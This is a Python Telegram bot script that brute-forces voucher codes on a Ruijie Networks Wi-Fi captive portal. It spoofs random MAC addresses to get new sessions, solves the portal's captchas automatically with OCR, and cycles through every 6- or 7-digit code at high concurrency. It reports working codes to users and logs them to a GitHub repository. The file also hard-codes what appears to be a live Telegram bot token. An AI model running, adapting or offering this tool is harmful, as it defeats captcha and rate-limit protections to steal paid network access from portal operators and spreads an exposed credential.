import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ==========================================
# Bot Configuration
# ==========================================
BOT_TOKEN = "8920875247:AAHowI29h7xFaDbyk9bCWXvsxIYhrk9CdVw"
ADMIN_ID = "1901101365"

GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
GITHUB_REPO = os.environ.get("GITHUB_REPO")

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_texts = {}
retry_counts = {}
_connector = None
CONCURRENCY = 30  # Reduced for stability on Render
_voucher_sem = asyncio.Semaphore(CONCURRENCY)

# ==========================================
# GitHub Storage Integration
# ==========================================
async def get_file_content(path):
    if not GITHUB_TOKEN or not GITHUB_REPO: return {}, None
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(url, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    content = base64.b64decode(data['content']).decode('utf-8')
                    return json.loads(content), data['sha']
                return {}, None
    except: return {}, None

async def update_file_content(path, content, sha, message):
    if not GITHUB_TOKEN or not GITHUB_REPO: return "No Config"
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    payload = {
        "message": message,
        "content": base64.b64encode(json.dumps(content, indent=4).encode('utf-8')).decode('utf-8')
    }
    if sha: payload["sha"] = sha
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.put(url, headers=headers, json=payload) as resp:
                return "saved" if resp.status in [200, 201] else "failed"
    except: return "error"

# ==========================================
# Web Server
# ==========================================
async def handle(request): return web.Response(text="Bot is awake!")
async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==========================================
# Bot Commands
# ==========================================
@bot.message_handler(commands=['start'])
async def start(message): await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve
    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key == ADMIN_ID or key in auth_list:
        approve[message.chat.id] = True
        user_data[message.chat.id] = {}
        await bot.reply_to(message, " ✅ Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။")
    else: await bot.reply_to(message, " ⚠️ သင်၏ key ကို registered မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return
    url = args[1]
    if message.chat.id in approve:
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(message, "✅ Session URL သိမ်းပြီးပါပြီ။ /scan 6, 7, 8 စသည်ဖြင့် စတင်ပါ။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return
    mode, chat_id = args[1], message.chat.id
    if not approve.get(chat_id, False) or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "⚠️ /key နှင့် /input အရင်လုပ်ပါ။")
        return
    progress_msg = await bot.send_message(chat_id, "🔍Scanning Codes...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    if message.chat.id in scan_tasks:
        scan_tasks[message.chat.id]["stop"] = True
        await bot.reply_to(message, "🛑 /scan ကို ရပ်တန့်ပြီးပါပြီ။")

async def github_update_scheduler():
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty(): items.append(await SUCCESS_CODE.get())
        if items:
            results, sha = await get_file_content("result.json")
            for item in items:
                uid, code = str(item["chat_id"]), item["code"]
                if uid not in results: results[uid] = []
                if f"🎫 {code}" not in results[uid]: results[uid].append(f"🎫 {code}")
            await update_file_content("result.json", results, sha, "Periodic Update")

# ==========================================
# Core Logic Restored (Strict Original)
# ==========================================
def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

async def get_session_id(session, session_url):
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0'}
    try:
        async with session.get(re.sub(r'(?<=mac=)[^&]+', get_mac(), session_url), headers=headers, allow_redirects=True, ssl=False) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else None
    except: return None

async def perform_check(session_url, code, chat_id, scan_id):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    for _attempt in range(3): # Restore 3 attempts
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as sess:
            sid = await get_session_id(sess, session_url)
            if not sid: continue
            
            auth_code = None
            for _ in range(5): # Captcha attempts
                try:
                    img_req = await sess.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sid}&_t={time.time()}', ssl=False)
                    img_bytes = await img_req.read()
                    text = await asyncio.to_thread(lambda: _ocr.classification(img_bytes).upper())
                    v = await sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': sid, 'authCode': text}, ssl=False)
                    v_data = await v.json()
                    if v_data.get("success"):
                        auth_code = text
                        break
                except: pass
            
            if not auth_code: continue
            
            data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
            headers = {
                "content-type": "application/json",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={sid}",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with sess.post(post_url, json=data, headers=headers, ssl=False) as req:
                    resp = await req.text()
                    if 'logonUrl' in resp:
                        if chat_id not in success_texts: success_texts[chat_id] = []
                        success_texts[chat_id].append(code)
                        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
                        await bot.send_message(chat_id, f"✅ Success Code Found: {code}")
                        return True
                    if 'request limited' in resp:
                        await asyncio.sleep(2) # Wait if limited
                        continue
                    return False
            except: pass
    retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
    return False

async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg):
    def iter_codes(m):
        if m in ["6", "7"]:
            c = [str(i).zfill(int(m)) for i in range(10**int(m))]
            random.shuffle(c)
            yield from c
        else:
            while True: yield "".join(random.choice(string.digits) for _ in range(8))
            
    code_iter = iter_codes(mode)
    checked, start = 0, time.monotonic()
    try:
        while not scan_tasks.get(chat_id, {}).get("stop"):
            batch = [next(code_iter) for _ in range(10)] # Smaller batches for stability
            await asyncio.gather(*[perform_check(session_url, c, chat_id, scan_id) for c in batch])
            checked += len(batch)
            if checked % 50 == 0:
                elapsed = time.monotonic() - start
                speed = (checked / elapsed * 60) if elapsed > 0 else 0
                found = len(success_texts.get(chat_id, []))
                text = f"🔍Scanning Codes...\n\n📦Checked : {checked:,}\n⚡Speed : {speed:,.0f} codes/min\n✅Found : {found}\n🔁Retry : {retry_counts.get(chat_id, 0)}"
                try: await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
                except: pass
            await asyncio.sleep(0.1) # Prevent CPU spikes
    finally: scan_tasks.pop(chat_id, None)

_ocr = ddddocr.DdddOcr(show_ad=False)

async def main():
    global _connector
    _connector = aiohttp.TCPConnector(limit=100, ssl=False)
    asyncio.create_task(web_server())
    asyncio.create_task(github_update_scheduler())
    await bot.infinity_polling()

if __name__ == '__main__':
    asyncio.run(main())
